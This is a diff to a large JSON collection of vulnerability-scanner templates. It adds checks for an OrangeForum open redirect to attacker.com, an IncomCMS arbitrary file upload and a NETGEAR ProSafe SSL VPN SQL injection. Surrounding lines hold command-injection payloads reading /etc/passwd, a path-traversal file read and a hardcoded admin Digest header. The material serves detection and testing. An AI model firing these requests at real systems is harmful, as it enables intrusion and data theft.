@@ -6450,6 +6450,22 @@
       ]
     },
     {
+      "id": "CVE-2018-14474",
+      "info": {
+        "name": "OrangeForum 1.4.0 - Open Redirect",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/login?next=http://attacker.com/?app.scan/",
+            "{{BaseURL}}/signup?next=http://attacker.com/?app.scan/"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2018-14574",
       "info": {
         "name": "Django Open Redirect",
@@ -10759,8 +10775,8 @@
         {
           "body": "op=login&username=;`cat /etc/passwd`&password=\n",
           "headers": {
-            "Content-Type": "application/x-www-form-urlencoded",
-            "Referer": "{{Hostname}}/module/login/login.html"
+            "Referer": "{{Hostname}}/module/login/login.html",
+            "Content-Type": "application/x-www-form-urlencoded"
           },
           "method": "POST",
           "path": [
@@ -11528,6 +11544,21 @@
           "path": [
             "{{BaseURL}}/s/{{randstr}}/_/%2e/WEB-INF/classes/META-INF/maven/com.atlassian.jira/jira-core/pom.xml",
             "{{BaseURL}}/s/{{randstr}}/_/%2e/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2020-29597",
+      "info": {
+        "name": "IncomCMS 2.0 - Arbitary files upload",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "raw": [
+            "POST /incom/modules/uploader/showcase/script.php HTTP/1.1\nHost: {{Hostname}}\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryBEJZt0IK73M2mAbt\n\n------WebKitFormBoundaryBEJZt0IK73M2mAbt\nContent-Disposition: form-data; name=\"Filedata\"; filename=\"{{randstr}}.png\"\nContent-Type: image/png\n\n\n------WebKitFormBoundaryBEJZt0IK73M2mAbt--\n",
+            "GET /upload/userfiles/image/{{randstr}}.png HTTP/1.1\nHost: {{Hostname}}\n"
           ]
         }
       ]
@@ -15553,8 +15584,8 @@
       "requests": [
         {
           "headers": {
-            "Referer": "{{BaseURL}}/assets/base/home.html",
-            "Authorization": "Digest username=\"admin\", realm=\"Bridge-IT\", nonce=\"d24d09512ebc3e43c4f6faf34fdb8c76\", uri=\"/api/get_device_details\", response=\"d052e9299debc7bd9cb8adef0a83fed4\", qop=auth, nc=00000001, cnonce=\"ae373d748855243d\""
+            "Authorization": "Digest username=\"admin\", realm=\"Bridge-IT\", nonce=\"d24d09512ebc3e43c4f6faf34fdb8c76\", uri=\"/api/get_device_details\", response=\"d052e9299debc7bd9cb8adef0a83fed4\", qop=auth, nc=00000001, cnonce=\"ae373d748855243d\"",
+            "Referer": "{{BaseURL}}/assets/base/home.html"
           },
           "method": "GET",
           "path": [
@@ -18253,6 +18284,21 @@
         {
           "raw": [
             "POST /conf_mail.php HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nmail_address=%3B{{cmd}}%3B&button=%83%81%81%5B%83%8B%91%97%90M\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-29383",
+      "info": {
+        "name": "NETGEAR ProSafe SSL VPN firmware - SQL Injection",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "raw": [
+            "POST /scgi-bin/platform.cgi HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded; charset=utf-8\n\nthispage=index.htm&USERDBUsers.UserName=NjVI&USERDBUsers.Password=&USERDBDomains.Domainname=geardomain'+AND+'5434'%3d'5435'+AND+'MwLj'%3d'MwLj&button.login.USERDBUsers.router_status=Login&Login.userAgent=MDpd\n",
+            "POST /scgi-bin/platform.cgi HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded; charset=utf-8\n\nthispage=index.htm&USERDBUsers.UserName=NjVI&USERDBUsers.Password=&USERDBDomains.Domainname=geardomain'+AND+'5434'%3d'5434'+AND+'MwLj'%3d'MwLj&button.login.USERDBUsers.router_status=Login&Login.userAgent=MDpd\n"
           ]
         }
       ]
